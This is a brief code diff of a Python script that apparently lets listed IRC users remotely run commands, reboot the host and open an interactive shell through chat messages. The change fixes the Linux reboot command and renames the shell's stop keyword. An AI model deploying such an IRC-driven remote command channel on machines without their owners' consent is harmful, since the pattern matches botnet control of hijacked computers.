@@ -220,7 +220,7 @@ def reboot(): #reboot the computer
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -r -t 0")
 	elif operatingSystem == "linux":
-		execute("poweroff")
+		execute("init 6")
 	elif operatingSystem == "darwin":
 		execute ("shutdown -r now")
 	else:
@@ -390,15 +390,12 @@ def parseCommand(command):
 				if nick in users or "all" in users:
 					lines[1] = lines[1].strip()
 					runFunction(lines[1])
-					# if lines[1] in commands.keys(): #if regular command
-						# commands[lines[1]]() #call appropriate function
-						# print "function called"
 			else:
 				runFunction(command) #run function
 		else:
 			print "user '%s' not in list of admins" % user
 
-	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
+	else: #we should not be listening, so we'll wait for '??finish' to end interactive shell
 		if "PRIVMSG" in command:
 			command = command[command.find("PRIVMSG"):]
 			command = command[(command.find(':') + 1):].strip().lower()
